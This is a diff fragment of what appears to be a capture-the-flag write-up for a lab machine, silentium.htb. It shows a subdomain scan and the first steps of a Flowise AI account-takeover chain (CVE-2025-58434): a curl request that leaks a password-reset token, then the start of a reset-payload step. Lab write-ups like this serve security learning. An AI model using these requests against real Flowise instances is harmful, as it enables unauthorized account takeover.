@@ -35,6 +35,7 @@ gobuster vhost -u http://silentium.htb -w /usr/share/wordlists/dirb/common.txt -
 Found: staging.silentium.htb (Flowise AI v3.0.5)
 
 💀 Foothold – Flowise AI RCE
+
 Step 1: Leak Password Reset Token (CVE-2025-58434)
 
 The /api/v1/account/forgot-password endpoint leaks the tempToken directly in the response.
@@ -44,6 +45,7 @@ curl -s http://staging.silentium.htb/api/v1/account/forgot-password \
   -d '{"user":{"email":"ben@silentium.htb"}}'
 
 Extract <LEAKED_TOKEN> from the response.
+
 Step 2: Reset Password (Flattened Payload!)
 
 The endpoint expects a flattened JSON payload (not nested under "user").
